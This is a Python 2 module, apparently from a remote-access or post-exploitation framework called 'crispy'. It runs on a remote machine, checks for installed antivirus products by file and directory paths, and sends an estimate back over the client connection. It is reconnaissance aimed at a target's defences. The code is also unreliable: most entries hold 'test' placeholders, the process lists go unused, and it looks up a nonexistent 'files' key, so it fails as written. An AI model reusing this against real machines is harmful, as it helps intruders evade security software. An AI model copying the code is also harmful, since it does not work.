import cPickle
import logging

from crispy.lib.module import *
from crispy.lib.fprint import *

logger = logging.getLogger(__name__)

__class_name__ = "CheckAVModule"
class CheckAVModule(CrispyModule):
    """ Determine which (if any) AV is on a remote machine. """

    compatible_systems = ['all']

    def marshall_me(self):
        import os
       
        adaware = {'name':'Ad Aware', 'binaries':['Ad-Aware.exe'], 'dirs':['test'], 'procs':[]}
        avast = {'name':'Avast', 'binaries':['test'], 'dirs':['test'], 'procs':[]} #windows, darwin, android, ios
        avg = {'name':'AVG', 'binaries':['test'], 'dirs':['test'], 'procs':[]}
        bitdefender = {'name':'BitDefender', 'binaries':['test'], 'dirs':['test'], 'procs':[]}
        comodo = {'name':'Comodo', 'binaries':['test'], 'dirs':['test'], 'procs':[]}
        malwarebytes = {'name':'Malware Bytes', 'binaries':['test'], 'dirs':['test'], 'procs':[]}
        panda = {'name':'Panda Cloud', 'binaries':['test'], 'dirs':['test'], 'procs':[]}
        sophos = {'name':'Sophos AV', 
                'binaries':['/usr/local/bin/sweep'], 
                'dirs':['/Applications/Sophos Anti-Virus.app'], 
                'procs':['SophosScanD', 'SophosWebIntelligence']}
        zonealarm = {'name':'Zone Alarm', 'binaries':['zonealarm.exe', 'zapro.exe'], 'dirs':['test'], 'procs':[]}
        av_list = [adaware, avast, avg, bitdefender, comodo, malwarebytes, panda, sophos, zonealarm]

        info = "\n"
        for av in av_list: #may need to do a dirwalk so I don't have to give paths to the files// or use psutil process list output to search for binaries
            fCount = dCount = pCount = 0
            for sf in av['binaries']:
                if os.path.isfile(sf):
                    fCount += 1
            for sd in av['dirs']:
                if os.path.isdir(sd):
                    dCount += 1
            
            div = float(len(av['files'])) + float(len(av['dirs']))
            info += "{} = {}%\n".format(av['name'], (fCount/div + dCount/div)*100) 
        return info

    def run(self, args):
	logger.debug("in checkav run()")
        info("Determining probability of the below AntiVirus software.")
        
        try:
            data = cPickle.dumps(self.marshall_me(), -1)
            self.client.conn.sendall(data)
            print "{}".format(self.client.conn.recv(1024))
            success("Done.")
        except Exception as e:
            error(e)
